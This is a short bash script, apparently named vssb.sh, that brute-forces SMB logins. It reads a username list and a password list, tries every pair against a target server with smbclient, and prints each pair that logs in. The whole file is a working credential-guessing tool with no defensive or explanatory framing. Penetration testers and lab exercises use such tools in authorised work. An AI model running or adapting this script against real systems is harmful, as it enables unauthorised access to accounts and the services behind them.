#!/bin/bash
usernames_list=""
passwords_list=""
domain=""
server=""

error() 
{ 
	echo $1
	echo "usage: ./vssb.sh -u users_list.txt -p password_list.txt [-d DOMAIN] -s 10.10.10.123"
	exit 1
}

while getopts u:p:d:s: arg
do
	case "${arg}" in
		u ) usernames_list=${OPTARG} ;;
		p ) passwords_list=${OPTARG} ;;
		d ) domain=${OPTARG} ;;
		s ) server=${OPTARG} ;;
    	esac
done
echo
if [ -z "$usernames_list" ] ; then error "parameter '-u' not set" ; fi
if [ -z "$passwords_list" ] ; then error "parameter '-p' not set" ; fi
if [ -z "$domain" ] ; then { echo "parameter '-d' not set: using default WORKGROUP"; domain="WORKGROUP"; } fi
if [ -z "$server" ] ; then error "parameter '-s' not set" ; fi
echo
echo "Usernames list: $usernames_list"
echo "Passwords list: $passwords_list"
echo "Current domain: $domain"
echo "Target server : $server"
echo 
echo "starting..."
echo 

for user in $(cat $usernames_list)
	do
		for pass in $(cat $passwords_list)
			do
				# Connection errors and similar will still be shown because they are written in stderr
				# "NT_STATUS_LOGON_FAILURE" and similar are written in stdout
				if ! smbclient -L \\\\$server\\ -U "$domain\\$user%$pass" | grep -q 'FAILURE'; then
   					echo "Found $domain@$user:$pass"
				fi
			done 
	done
echo 
echo "done!"
